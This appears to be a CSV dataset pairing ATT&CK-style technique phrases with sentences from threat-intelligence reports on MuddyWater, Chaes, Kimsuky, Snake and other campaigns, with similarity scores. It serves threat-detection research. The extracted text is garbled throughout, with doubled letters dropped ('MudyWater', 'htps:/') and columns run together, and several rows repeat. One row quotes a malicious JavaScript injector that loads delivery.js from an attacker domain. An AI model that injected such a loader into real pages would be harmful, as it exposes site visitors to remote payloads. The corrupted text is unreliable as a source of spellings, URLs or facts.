hash,phrase,similarity,adjacent_sentences
3cf141b028db3aab402c5f1968e5d55e,"MuddyWater has used malware that checked if the ProgramData folder had folders or files with the keywords ""Kasper,"" ""Panda,"" or ""ESET.""",0.7942093638857084,"['Credentials: Credentials In Files Discovery System Network T1016 MudyWater has used malware to colect the victims IP adres and domain name.', 'Configuration Discovery System Owner/User T103 MudyWater has used malware that can colect the victims username.', 'Discovery System Network T1049 MudyWater has used a PowerShel backdor to check for Skype conections on Conections the target machine.', 'Discovery Proces Discovery T1057 MudyWater has used malware to obtain a list of runing proceses on the system.', 'System Information T1082 MudyWater has used malware that can colect the victims OS version and machine Discovery name.', 'File and Directory T1083 MudyWater has used malware that checked if the ProgramData folder had folders Discovery or files with the keywords ""Kasper,"" ""Panda,"" or ""ESET.""', 'Acount Discovery: T1087.02 MudyWater has used cmd.exe net user/domain to enumerate domain users.', 'Domain Acount Software Discovery T1518 MudyWater has used a PowerShel backdor to check for Skype conectivity on the target machine.', 'Security Software T1518.01 MudyWater has used malware to check runing proceses against a hard-coded Discovery list of security tols often used by malware researchers.', 'Colection Scren Capture T13 MudyWater has used malware that can capture screnshots of the victims machine.', 'Archive Colected T1560.01 MudyWater has used the native Windows cabinet creation tol, makecab.exe , Data: Archive via likely to compres stolen data to be uploaded.']"
2e85211509d84affdc2b7b930c50be85,Chaes has used JavaScript and Node.Js information stealer script that exfiltrates data using the node process.,0.7827310330132219,"['In recent years, the LATAM cybercrime scene has evolved a great deal.', 'Some of the most notorious malware variants that have ben prominent in the region over the last year include Grandoreiro, Ursa and Astaroth.', 'LATAM cybercrime activities demonstrate unique features when it comes to TPs and how malware is propagated on an infected machine.', 'Some of the shared similarities include: Leveraging of .MSI files as an initial way to start the infection chain The use of Delphi as the prefered language to write malware Extensive use of LOLBins to execute content Downloading aditional legitimate tols to expand the malwares capabilities and for obfuscation When observing the shared behavior and mindset of LATAM-based threat actors, Cybereason researchers observed that the malware authors emphasize the ned to stay under the radar as much as posible, and prefer to use already-existing tols or legitimate software if it fits their neds.', 'FIGURE 1 Ful Atack Infographic Chaes: Novel Malware Targeting Latin American E-Comerce 2 Key Findings Targeting the Bigest E-Comerce Company in Latin America: Chaes specificaly targets the Brazilian website of e-comerce company MercadoLivre and its payment page MercadoPago to steal its customers financial information.', 'The final payload of Chaes is a Node.Js information stealer that exfiltrates data using the node proces.', 'Credential Stealing, Scren Capture, Browser Monitoring, Reconaisance: Chaes is designed to steal sensitive information from the browser such as login credentials, credit card numbers, and other financial information from MercadoLivre website customers.', 'Chaes also takes screnshots of the infected machine, hoks and monitors the Chrome web browser to colect user information from infected hosts.', 'Multistage Delivery, Multi-Language Malware: Chaes delivery consists of several stages that include use of LoLbins and other legitimate software, making it very chalenging to detect by traditional AV products.', 'Chaes also has multiple stages and is writen in several programing languages including Javascript, Vbscript, .NET , Delphi and Node.js Downloads Legitimate Software, Designed for Stealth: Chaes operates using legitimate tols such as Python, Unrar and Node.js, and Chaes stages consist of several techniques such as use of LoLbins, open source tols, fileles parts and legitimate node.js libraries designed to increase the malwares stealthines.', 'Under development: Cybereason observed new versions of Chaes, showing that the authors are improving the malware and ading more features FIGURE 1 Cybereason Anti-Malware Solution Detects and Prevents Chaes Chaes: Novel Malware Targeting Latin American E-Comerce 3 Threat Analysis Phase One: Initial Aces FIGURE 3 First stage of Deployment As with many traditional campaigns, this one begins by sending the victim a phishing email containing a .docx file.']"
2e85211509d84affdc2b7b930c50be85,Chaes has used JavaScript and Node.Js information stealer script that exfiltrates data using the node process.,0.7827310330132219,"['In recent years, the LATAM cybercrime scene has evolved a great deal.', 'Some of the most notorious malware variants that have ben prominent in the region over the last year include Grandoreiro, Ursa and Astaroth.', 'LATAM cybercrime activities demonstrate unique features when it comes to TPs and how malware is propagated on an infected machine.', 'Some of the shared similarities include: Leveraging of .MSI files as an initial way to start the infection chain The use of Delphi as the prefered language to write malware Extensive use of LOLBins to execute content Downloading aditional legitimate tols to expand the malwares capabilities and for obfuscation When observing the shared behavior and mindset of LATAM-based threat actors, Cybereason researchers observed that the malware authors emphasize the ned to stay under the radar as much as posible, and prefer to use already-existing tols or legitimate software if it fits their neds.', 'FIGURE 1 Ful Atack Infographic Chaes: Novel Malware Targeting Latin American E-Comerce 2 Key Findings Targeting the Bigest E-Comerce Company in Latin America: Chaes specificaly targets the Brazilian website of e-comerce company MercadoLivre and its payment page MercadoPago to steal its customers financial information.', 'The final payload of Chaes is a Node.Js information stealer that exfiltrates data using the node proces.', 'Credential Stealing, Scren Capture, Browser Monitoring, Reconaisance: Chaes is designed to steal sensitive information from the browser such as login credentials, credit card numbers, and other financial information from MercadoLivre website customers.', 'Chaes also takes screnshots of the infected machine, hoks and monitors the Chrome web browser to colect user information from infected hosts.', 'Multistage Delivery, Multi-Language Malware: Chaes delivery consists of several stages that include use of LoLbins and other legitimate software, making it very chalenging to detect by traditional AV products.', 'Chaes also has multiple stages and is writen in several programing languages including Javascript, Vbscript, .NET , Delphi and Node.js Downloads Legitimate Software, Designed for Stealth: Chaes operates using legitimate tols such as Python, Unrar and Node.js, and Chaes stages consist of several techniques such as use of LoLbins, open source tols, fileles parts and legitimate node.js libraries designed to increase the malwares stealthines.', 'Under development: Cybereason observed new versions of Chaes, showing that the authors are improving the malware and ading more features FIGURE 1 Cybereason Anti-Malware Solution Detects and Prevents Chaes Chaes: Novel Malware Targeting Latin American E-Comerce 3 Threat Analysis Phase One: Initial Aces FIGURE 3 First stage of Deployment As with many traditional campaigns, this one begins by sending the victim a phishing email containing a .docx file.']"
7c77920efdfd2b078c6cd6a3c2c3a138,"When it first starts, BADNEWS spawns a new thread to log keystrokes.",0.7806632049557497,"['Andy Setle Head of Special Investigations MONSON ANALYSIS OF AN APT CAMPAIGN Revision: 1.07 | TLP-WHITE | 1/57 Forcepoint Security Labs | Special Investigations TABLE OF CONTENTS Executive Sumary .', '4 Acknowledgements .', '4 Sumary of Observations .', '5 Key Features .', '5 Adversary.', '.', '5 Intent.', '.', '5 Infrastructure .', '5 Capability .', '5 Victims .']"
7c77920efdfd2b078c6cd6a3c2c3a138,"When it first starts, BADNEWS spawns a new thread to log keystrokes.",0.7806632049557497,"['Andy Setle Head of Special Investigations MONSON ANALYSIS OF AN APT CAMPAIGN Revision: 1.07 | TLP-WHITE | 1/57 Forcepoint Security Labs | Special Investigations TABLE OF CONTENTS Executive Sumary .', '4 Acknowledgements .', '4 Sumary of Observations .', '5 Key Features .', '5 Adversary.', '.', '5 Intent.', '.', '5 Infrastructure .', '5 Capability .', '5 Victims .']"
18c26951bd00fb6e41199b99210fa0f8,LSA secrets are stored in the registry at HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets.,0.8890958924191853,"['If the browser version contains a vulnerability, coresponding exploitation code gets run on the target system, potentialy giving the atacker a remote code execution ability.', 'For these types of atacks, adversaries often leverage JavaScript.', 'For instance, acording to a malware analysis report performed by Palo Alto, analyzing threat samples from April 202 to June 202, among al of the web threats detected during the research, JavaScript downloaders and redirectors were in the top 5 most leveraged web threats, infecting around 30 diferent domains [31].', 'Analysis shows that atackers often inject malicious JavaScript downloaders to a webpage owned by them, creating several new script elements that redirect website visitors to ads, spams, or any other malicious domains such as train[.]developfirstline[.', ']com: .', '.', '.', 'Element.prototype.apendAfter = function(element) { element.parentNode.insertBefore(this, element.nextSibling) ), false(function () { var elem = document.createElement(\'script"") elem.type = \'text / javascript\' elem.sc = \'htps:/train.developfirstline.com/delivery.js?s=3\' elem.apendAfter(document.getElementsByTagName(\'script\')(0]) elem.apendAfter(document.getElementsByTagName(""\'head\')[0]) document.getElementsByTagName(\'head\')(01.apendChild(elem) .', '.', '.', '37 #1.8.']"
18c26951bd00fb6e41199b99210fa0f8,LSA secrets are stored in the registry at HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets.,0.8675964422559309,"['If the browser version contains a vulnerability, coresponding exploitation code gets run on the target system, potentialy giving the atacker a remote code execution ability.', 'For these types of atacks, adversaries often leverage JavaScript.', 'For instance, acording to a malware analysis report performed by Palo Alto, analyzing threat samples from April 202 to June 202, among al of the web threats detected during the research, JavaScript downloaders and redirectors were in the top 5 most leveraged web threats, infecting around 30 diferent domains [31].', 'Analysis shows that atackers often inject malicious JavaScript downloaders to a webpage owned by them, creating several new script elements that redirect website visitors to ads, spams, or any other malicious domains such as train[.]developfirstline[.', ']com: .', '.', '.', 'Element.prototype.apendAfter = function(element) { element.parentNode.insertBefore(this, element.nextSibling) ), false(function () { var elem = document.createElement(\'script"") elem.type = \'text / javascript\' elem.sc = \'htps:/train.developfirstline.com/delivery.js?s=3\' elem.apendAfter(document.getElementsByTagName(\'script\')(0]) elem.apendAfter(document.getElementsByTagName(""\'head\')[0]) document.getElementsByTagName(\'head\')(01.apendChild(elem) .', '.', '.', '37 #1.8.']"
963e1719ec5d5d85d8e7b1759ab8fb7a,The Launch Agent name may be disguised by using a name from the related operating system or benign software.,0.7740440340399479,"['PowerShel comands/scripts can be executed without invoking powershel.exe through HTA files or mshta.exe.24, 25, 26, 27 Persistence Kimsuky has demonstrated the ability to establish Persistence [TA03] through using malicious browser extensions, modifying system proceses, manipulating the autostart execution, using Remote Desktop Protocol (RDP), and changing the default file asociation for an aplication.', 'By using these methods, Kimsuky can gain login and pasword information and/or launch malware outside of some aplication alowlisting solutions.', 'In 2018, Kimsuky used an extension, which was available on the Gogle Chrome Web Store, to infect victims and steal paswords and cokies from their browsers (Man-in-the-Browser [T185]).', 'The extensions reviews gave it a five-star rating, however the text of the reviews aplied to other extensions or was negative.', 'The reviews were likely left by compromised Gogle+ acounts.28 19 CYWARE Social: Babyshark malware continues to target nuclear and cryptocurency industries htps:/cyware.com/news/babyshark-malware-continues-to-target-nuclear-and-cryptocurency-industries-40e04829 20 MITRE AT&CK: Groups Kimsuky htps:/atack.mitre.org/groups/G094/ 21 Palo Alto Networks Unit 42: New BabyShark Malware Targets U.S. National Security Think Tanks htps:/unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/ 2 Palo Alto Networks Unit 42: BabyShark Malware Part Two Atacks Continue Using KimJongRAT and PCRat htps:/unit42.paloaltonetworks.com/babyshark-malware-part-two-atacks-continue-using-kimjongrat-and-pcrat/ 23 CYWARE Social: Babyshark malware continues to target nuclear and cryptocurency industries htps:/cyware.com/news/babyshark-malware-continues-to-target-nuclear-and-cryptocurency-industries-40e04829 24 MITRE AT&CK: Groups Kimsuky htps:/atack.mitre.org/groups/G094/ 25 Palo Alto Networks Unit 42: BabyShark Malware Part Two Atacks Continue Using KimJongRAT and PCRat htps:/unit42.paloaltonetworks.com/babyshark-malware-part-two-atacks-continue-using-kimjongrat-and-pcrat/ 26 McAfe: What is mshta, how can it be used and how to protect against it htps:/w.mcafe.com/blogs/other-blogs/mcafe-labs/what-is-mshta-how-can-it-be-used-and-how-to-protect-against-it/ 27 Palo Alto Networks Unit 42: New BabyShark Malware Targets U.S. National Security Think Tanks htps:/unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/ 28 Netscout: Stolen Pencil Campaign Targets Academia htps:/w.netscout.com/blog/asert/stolen-pencil-campaign-targets-academia Page 5 of 15 | Product ID: A20-301A TLP:WHITE TLP:W HITE CISA | FBI | CNMF FBI | Kimsuky may instal a new service that can execute at startup by using utilities to interact with services or by directly modifying the Registry keys (Bot or Logon Autostart Execution [T1547]).', 'The service name may be disguised with the name from a related operating system function or by masquerading as benign software.', 'Services may be created with administrator privileges but are executed under system privileges, so an adversary can also use a service to escalate privileges from Administrator to System.', 'They can also directly start services through Service Execution.29, 30 During the STOLEN PENCIL operation in May 2018, Kimsuky used the GREASE malware.', 'GREASE is a tol capable of ading a Windows administrator acount and enabling RDP while avoiding firewal rules (Remote Services: Remote Desktop Protocol [T1021.01]).31 Kimsuky uses a document stealer module that changes the default program asociated with Hangul Word Procesor (HWP) documents (.hwp files) in the Registry (Event Trigered Execution: Change Default File Asociation [T1546.01]).', 'Kimsuky manipulates the default Registry seting to open a malicious program instead of the legitimate HWP program (HWP is a Korean word procesor).', 'The malware wil read and email the content from HWP documents before the legitimate HWP program ultimately opens the document.32 Kimsuky also targets Microsoft Ofice users by formating their documents in a .docx file rather than .hwp and wil tailor their macros acordingly.3 Kimsuky maintains aces to compromised domains by uploading actor-modified versions of open-source Hypertext Procesor (PHP)-based web shels; these web shels enable the APT actor to upload, download, and delete files and directories on the compromised domains (Server Software Component: Web Shel [T1505.03]).']"
963e1719ec5d5d85d8e7b1759ab8fb7a,The Launch Agent name may be disguised by using a name from the related operating system or benign software.,0.7740440340399479,"['PowerShel comands/scripts can be executed without invoking powershel.exe through HTA files or mshta.exe.24, 25, 26, 27 Persistence Kimsuky has demonstrated the ability to establish Persistence [TA03] through using malicious browser extensions, modifying system proceses, manipulating the autostart execution, using Remote Desktop Protocol (RDP), and changing the default file asociation for an aplication.', 'By using these methods, Kimsuky can gain login and pasword information and/or launch malware outside of some aplication alowlisting solutions.', 'In 2018, Kimsuky used an extension, which was available on the Gogle Chrome Web Store, to infect victims and steal paswords and cokies from their browsers (Man-in-the-Browser [T185]).', 'The extensions reviews gave it a five-star rating, however the text of the reviews aplied to other extensions or was negative.', 'The reviews were likely left by compromised Gogle+ acounts.28 19 CYWARE Social: Babyshark malware continues to target nuclear and cryptocurency industries htps:/cyware.com/news/babyshark-malware-continues-to-target-nuclear-and-cryptocurency-industries-40e04829 20 MITRE AT&CK: Groups Kimsuky htps:/atack.mitre.org/groups/G094/ 21 Palo Alto Networks Unit 42: New BabyShark Malware Targets U.S. National Security Think Tanks htps:/unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/ 2 Palo Alto Networks Unit 42: BabyShark Malware Part Two Atacks Continue Using KimJongRAT and PCRat htps:/unit42.paloaltonetworks.com/babyshark-malware-part-two-atacks-continue-using-kimjongrat-and-pcrat/ 23 CYWARE Social: Babyshark malware continues to target nuclear and cryptocurency industries htps:/cyware.com/news/babyshark-malware-continues-to-target-nuclear-and-cryptocurency-industries-40e04829 24 MITRE AT&CK: Groups Kimsuky htps:/atack.mitre.org/groups/G094/ 25 Palo Alto Networks Unit 42: BabyShark Malware Part Two Atacks Continue Using KimJongRAT and PCRat htps:/unit42.paloaltonetworks.com/babyshark-malware-part-two-atacks-continue-using-kimjongrat-and-pcrat/ 26 McAfe: What is mshta, how can it be used and how to protect against it htps:/w.mcafe.com/blogs/other-blogs/mcafe-labs/what-is-mshta-how-can-it-be-used-and-how-to-protect-against-it/ 27 Palo Alto Networks Unit 42: New BabyShark Malware Targets U.S. National Security Think Tanks htps:/unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/ 28 Netscout: Stolen Pencil Campaign Targets Academia htps:/w.netscout.com/blog/asert/stolen-pencil-campaign-targets-academia Page 5 of 15 | Product ID: A20-301A TLP:WHITE TLP:W HITE CISA | FBI | CNMF FBI | Kimsuky may instal a new service that can execute at startup by using utilities to interact with services or by directly modifying the Registry keys (Bot or Logon Autostart Execution [T1547]).', 'The service name may be disguised with the name from a related operating system function or by masquerading as benign software.', 'Services may be created with administrator privileges but are executed under system privileges, so an adversary can also use a service to escalate privileges from Administrator to System.', 'They can also directly start services through Service Execution.29, 30 During the STOLEN PENCIL operation in May 2018, Kimsuky used the GREASE malware.', 'GREASE is a tol capable of ading a Windows administrator acount and enabling RDP while avoiding firewal rules (Remote Services: Remote Desktop Protocol [T1021.01]).31 Kimsuky uses a document stealer module that changes the default program asociated with Hangul Word Procesor (HWP) documents (.hwp files) in the Registry (Event Trigered Execution: Change Default File Asociation [T1546.01]).', 'Kimsuky manipulates the default Registry seting to open a malicious program instead of the legitimate HWP program (HWP is a Korean word procesor).', 'The malware wil read and email the content from HWP documents before the legitimate HWP program ultimately opens the document.32 Kimsuky also targets Microsoft Ofice users by formating their documents in a .docx file rather than .hwp and wil tailor their macros acordingly.3 Kimsuky maintains aces to compromised domains by uploading actor-modified versions of open-source Hypertext Procesor (PHP)-based web shels; these web shels enable the APT actor to upload, download, and delete files and directories on the compromised domains (Server Software Component: Web Shel [T1505.03]).']"
963e1719ec5d5d85d8e7b1759ab8fb7a,The daemon name may be disguised by using a name from a related operating system or benign software  Masquerading.,0.840505184599649,"['PowerShel comands/scripts can be executed without invoking powershel.exe through HTA files or mshta.exe.24, 25, 26, 27 Persistence Kimsuky has demonstrated the ability to establish Persistence [TA03] through using malicious browser extensions, modifying system proceses, manipulating the autostart execution, using Remote Desktop Protocol (RDP), and changing the default file asociation for an aplication.', 'By using these methods, Kimsuky can gain login and pasword information and/or launch malware outside of some aplication alowlisting solutions.', 'In 2018, Kimsuky used an extension, which was available on the Gogle Chrome Web Store, to infect victims and steal paswords and cokies from their browsers (Man-in-the-Browser [T185]).', 'The extensions reviews gave it a five-star rating, however the text of the reviews aplied to other extensions or was negative.', 'The reviews were likely left by compromised Gogle+ acounts.28 19 CYWARE Social: Babyshark malware continues to target nuclear and cryptocurency industries htps:/cyware.com/news/babyshark-malware-continues-to-target-nuclear-and-cryptocurency-industries-40e04829 20 MITRE AT&CK: Groups Kimsuky htps:/atack.mitre.org/groups/G094/ 21 Palo Alto Networks Unit 42: New BabyShark Malware Targets U.S. National Security Think Tanks htps:/unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/ 2 Palo Alto Networks Unit 42: BabyShark Malware Part Two Atacks Continue Using KimJongRAT and PCRat htps:/unit42.paloaltonetworks.com/babyshark-malware-part-two-atacks-continue-using-kimjongrat-and-pcrat/ 23 CYWARE Social: Babyshark malware continues to target nuclear and cryptocurency industries htps:/cyware.com/news/babyshark-malware-continues-to-target-nuclear-and-cryptocurency-industries-40e04829 24 MITRE AT&CK: Groups Kimsuky htps:/atack.mitre.org/groups/G094/ 25 Palo Alto Networks Unit 42: BabyShark Malware Part Two Atacks Continue Using KimJongRAT and PCRat htps:/unit42.paloaltonetworks.com/babyshark-malware-part-two-atacks-continue-using-kimjongrat-and-pcrat/ 26 McAfe: What is mshta, how can it be used and how to protect against it htps:/w.mcafe.com/blogs/other-blogs/mcafe-labs/what-is-mshta-how-can-it-be-used-and-how-to-protect-against-it/ 27 Palo Alto Networks Unit 42: New BabyShark Malware Targets U.S. National Security Think Tanks htps:/unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/ 28 Netscout: Stolen Pencil Campaign Targets Academia htps:/w.netscout.com/blog/asert/stolen-pencil-campaign-targets-academia Page 5 of 15 | Product ID: A20-301A TLP:WHITE TLP:W HITE CISA | FBI | CNMF FBI | Kimsuky may instal a new service that can execute at startup by using utilities to interact with services or by directly modifying the Registry keys (Bot or Logon Autostart Execution [T1547]).', 'The service name may be disguised with the name from a related operating system function or by masquerading as benign software.', 'Services may be created with administrator privileges but are executed under system privileges, so an adversary can also use a service to escalate privileges from Administrator to System.', 'They can also directly start services through Service Execution.29, 30 During the STOLEN PENCIL operation in May 2018, Kimsuky used the GREASE malware.', 'GREASE is a tol capable of ading a Windows administrator acount and enabling RDP while avoiding firewal rules (Remote Services: Remote Desktop Protocol [T1021.01]).31 Kimsuky uses a document stealer module that changes the default program asociated with Hangul Word Procesor (HWP) documents (.hwp files) in the Registry (Event Trigered Execution: Change Default File Asociation [T1546.01]).', 'Kimsuky manipulates the default Registry seting to open a malicious program instead of the legitimate HWP program (HWP is a Korean word procesor).', 'The malware wil read and email the content from HWP documents before the legitimate HWP program ultimately opens the document.32 Kimsuky also targets Microsoft Ofice users by formating their documents in a .docx file rather than .hwp and wil tailor their macros acordingly.3 Kimsuky maintains aces to compromised domains by uploading actor-modified versions of open-source Hypertext Procesor (PHP)-based web shels; these web shels enable the APT actor to upload, download, and delete files and directories on the compromised domains (Server Software Component: Web Shel [T1505.03]).']"
963e1719ec5d5d85d8e7b1759ab8fb7a,The daemon name may be disguised by using a name from a related operating system or benign software  Masquerading.,0.840505184599649,"['PowerShel comands/scripts can be executed without invoking powershel.exe through HTA files or mshta.exe.24, 25, 26, 27 Persistence Kimsuky has demonstrated the ability to establish Persistence [TA03] through using malicious browser extensions, modifying system proceses, manipulating the autostart execution, using Remote Desktop Protocol (RDP), and changing the default file asociation for an aplication.', 'By using these methods, Kimsuky can gain login and pasword information and/or launch malware outside of some aplication alowlisting solutions.', 'In 2018, Kimsuky used an extension, which was available on the Gogle Chrome Web Store, to infect victims and steal paswords and cokies from their browsers (Man-in-the-Browser [T185]).', 'The extensions reviews gave it a five-star rating, however the text of the reviews aplied to other extensions or was negative.', 'The reviews were likely left by compromised Gogle+ acounts.28 19 CYWARE Social: Babyshark malware continues to target nuclear and cryptocurency industries htps:/cyware.com/news/babyshark-malware-continues-to-target-nuclear-and-cryptocurency-industries-40e04829 20 MITRE AT&CK: Groups Kimsuky htps:/atack.mitre.org/groups/G094/ 21 Palo Alto Networks Unit 42: New BabyShark Malware Targets U.S. National Security Think Tanks htps:/unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/ 2 Palo Alto Networks Unit 42: BabyShark Malware Part Two Atacks Continue Using KimJongRAT and PCRat htps:/unit42.paloaltonetworks.com/babyshark-malware-part-two-atacks-continue-using-kimjongrat-and-pcrat/ 23 CYWARE Social: Babyshark malware continues to target nuclear and cryptocurency industries htps:/cyware.com/news/babyshark-malware-continues-to-target-nuclear-and-cryptocurency-industries-40e04829 24 MITRE AT&CK: Groups Kimsuky htps:/atack.mitre.org/groups/G094/ 25 Palo Alto Networks Unit 42: BabyShark Malware Part Two Atacks Continue Using KimJongRAT and PCRat htps:/unit42.paloaltonetworks.com/babyshark-malware-part-two-atacks-continue-using-kimjongrat-and-pcrat/ 26 McAfe: What is mshta, how can it be used and how to protect against it htps:/w.mcafe.com/blogs/other-blogs/mcafe-labs/what-is-mshta-how-can-it-be-used-and-how-to-protect-against-it/ 27 Palo Alto Networks Unit 42: New BabyShark Malware Targets U.S. National Security Think Tanks htps:/unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/ 28 Netscout: Stolen Pencil Campaign Targets Academia htps:/w.netscout.com/blog/asert/stolen-pencil-campaign-targets-academia Page 5 of 15 | Product ID: A20-301A TLP:WHITE TLP:W HITE CISA | FBI | CNMF FBI | Kimsuky may instal a new service that can execute at startup by using utilities to interact with services or by directly modifying the Registry keys (Bot or Logon Autostart Execution [T1547]).', 'The service name may be disguised with the name from a related operating system function or by masquerading as benign software.', 'Services may be created with administrator privileges but are executed under system privileges, so an adversary can also use a service to escalate privileges from Administrator to System.', 'They can also directly start services through Service Execution.29, 30 During the STOLEN PENCIL operation in May 2018, Kimsuky used the GREASE malware.', 'GREASE is a tol capable of ading a Windows administrator acount and enabling RDP while avoiding firewal rules (Remote Services: Remote Desktop Protocol [T1021.01]).31 Kimsuky uses a document stealer module that changes the default program asociated with Hangul Word Procesor (HWP) documents (.hwp files) in the Registry (Event Trigered Execution: Change Default File Asociation [T1546.01]).', 'Kimsuky manipulates the default Registry seting to open a malicious program instead of the legitimate HWP program (HWP is a Korean word procesor).', 'The malware wil read and email the content from HWP documents before the legitimate HWP program ultimately opens the document.32 Kimsuky also targets Microsoft Ofice users by formating their documents in a .docx file rather than .hwp and wil tailor their macros acordingly.3 Kimsuky maintains aces to compromised domains by uploading actor-modified versions of open-source Hypertext Procesor (PHP)-based web shels; these web shels enable the APT actor to upload, download, and delete files and directories on the compromised domains (Server Software Component: Web Shel [T1505.03]).']"
a8fe327a9e3cba110d1022347ced8de6,"HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser.",0.8155609836104549,"['This is because proxy execution of malicious .hta files Mshta wil execute HTA content in files with any extension (or none at al) as long and Javascript or VBScript through as the file extension is not maped to a text/plain MIME type (e.g., Mshta wil not a trusted Windows utility.', 'There are execute a file with a .txt extension).', 'To further disguise Mshta execution, TA51 several examples of diferent types of renamed the binary in atempts to evade detection logic, which relied on Mshta threats leveraging mshta.exe during executing with its expected filename of mshta.exe.', 'initial compromise and for execution of code.', 'Mshta.exe is a utility that executes Microsoft HTML Aplications (HTA) files.', 'Detection HTAs are standalone aplications that execute using the same models and Colection requirements technologies of Internet Explorer, but outside of the browser.', 'Proces and comand-line monitoring Monitoring proces execution and comand-line parameters wil ofer defenders visibility into many behaviors asociated with malicious abuse of Mshta.', 'Similarly, proces lineage is also helpful for detecting adversary use of Mshta.', 'At a minimum, colect parent-child proces relationships, and, if posible, consider colecting information about grandparent relationships to.', 'Proces metadata We observed multiple adversaries this year renaming the Mshta binary to evade britle detection logic.', 'While we cover this extensively in our analysis of T1036.03: Rename System Utilities, binary metadata like internal proces names are an efective data source to determine the true identity of a given proces.']"
acd03c02cf6ad2828aa2ea83deeab0e9,Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement.,0.785459815318749,"['Information is subject to standard copyright rules.', 'For more information on the Trafic Light Protocol, se cisa.gov/tlp/.', 'TLP:CLEAR TLP:CLEAR International Partnership TABLE OF CONTENTS Sumary .', '1 Introduction .', '4 What is Snake?', '.', '4 Background .', '4 Atribution .', '5 Victimization .', '5 Other Tols and TPs Employed with Snake .', '6 Snake Architecture .']"
acd03c02cf6ad2828aa2ea83deeab0e9,"Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit.",0.8016199269921424,"['Information is subject to standard copyright rules.', 'For more information on the Trafic Light Protocol, se cisa.gov/tlp/.', 'TLP:CLEAR TLP:CLEAR International Partnership TABLE OF CONTENTS Sumary .', '1 Introduction .', '4 What is Snake?', '.', '4 Background .', '4 Atribution .', '5 Victimization .', '5 Other Tols and TPs Employed with Snake .', '6 Snake Architecture .']"
d5fe2b7854061f106d83b756e64e627e,NanHaiShu modifies the %regrun% Registry to point itself to an autostart mechanism.,0.7694380468356236,"['IMAGE 6: VBA MACRO DECODES AND EXECUTES THE JSCRIPT 6 NANHAISHU RATing the South China Sea In most of the samples, two sets of Base64 encoded files are embeded in the VBA macro.', 'For the recent sample, the VBA macro wil decode and first write JScript data to %apdata%\\Microsoft\\Network\\network.js, then execute it.', 'IMAGE 7: VBA MACRO DECODES & OPENS DECOY XLS FILE The macro then decodes a decoy XLS file, which it saves to the curent directory using the same filename as the malicious XLS.', 'The decoy is then loaded.', 'Finaly, the macro creates a VBScript file that wil delete the original file.', 'Meanwhile, the network.js modifies the %regrun% registry to point to itself as its autostart mechanism.', 'The code wil proced to retrieve the folowing system information (Image 8, next page) and upload it to the C&C server: 1.', 'Volume Serial Number 2.', 'IP Adres 3.', 'Computer Name 4.', 'User Name 5.']"
d5fe2b7854061f106d83b756e64e627e,NanHaiShu modifies the %regrun% Registry to point itself to an autostart mechanism.,0.7694380468356236,"['IMAGE 6: VBA MACRO DECODES AND EXECUTES THE JSCRIPT 6 NANHAISHU RATing the South China Sea In most of the samples, two sets of Base64 encoded files are embeded in the VBA macro.', 'For the recent sample, the VBA macro wil decode and first write JScript data to %apdata%\\Microsoft\\Network\\network.js, then execute it.', 'IMAGE 7: VBA MACRO DECODES & OPENS DECOY XLS FILE The macro then decodes a decoy XLS file, which it saves to the curent directory using the same filename as the malicious XLS.', 'The decoy is then loaded.', 'Finaly, the macro creates a VBScript file that wil delete the original file.', 'Meanwhile, the network.js modifies the %regrun% registry to point to itself as its autostart mechanism.', 'The code wil proced to retrieve the folowing system information (Image 8, next page) and upload it to the C&C server: 1.', 'Volume Serial Number 2.', 'IP Adres 3.', 'Computer Name 4.', 'User Name 5.']"
